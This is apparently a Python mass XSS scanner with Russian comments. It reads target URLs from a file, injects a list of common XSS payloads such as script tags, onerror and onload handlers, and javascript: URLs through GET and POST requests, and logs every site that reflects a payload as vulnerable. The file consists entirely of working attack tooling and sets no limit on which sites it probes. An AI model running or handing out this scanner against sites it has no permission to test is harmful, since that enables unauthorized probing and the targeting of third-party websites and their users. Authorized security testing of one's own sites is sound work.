import requests
import itertools

# Популярные XSS пейлоады
xss_payloads = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "'\"><script>alert('XSS')</script>",
    "<svg/onload=alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<iframe src=javascript:alert('XSS')>",
    "<a href=javascript:alert('XSS')>ClickMe</a>",
    "'';!--\"<XSS>=&{()}",
    "<script>document.write('XSS')</script>"
]

# Читаем список сайтов из файла
with open("sites.txt", "r") as file:
    urls = [line.strip() for line in file.readlines()]

# Функция проверки XSS через GET и POST
def check_xss(url):
    try:
        print(f"[*] Проверка {url} на XSS...")
        
        for payload in xss_payloads:
            # Проверка GET-запроса
            test_url = f"{url}?q={payload}"
            response = requests.get(test_url, timeout=5)
            
            if payload in response.text:
                print(f"[!] XSS найдена (GET): {url}")
                with open("xss_vulnerable.txt", "a") as vuln_file:
                    vuln_file.write(f"{url} (GET)\n")
                return
            
            # Проверка POST-запроса
            post_data = {'q': payload}
            response = requests.post(url, data=post_data, timeout=5)
            
            if payload in response.text:
                print(f"[!] XSS найдена (POST): {url}")
                with open("xss_vulnerable.txt", "a") as vuln_file:
                    vuln_file.write(f"{url} (POST)\n")
                return

        print(f"[-] XSS не найдена: {url}")
    
    except requests.exceptions.RequestException as e:
        print(f"[ERROR] Ошибка при проверке {url}: {e}")

# Запуск сканирования всех сайтов
for site in urls:
    check_xss(site)
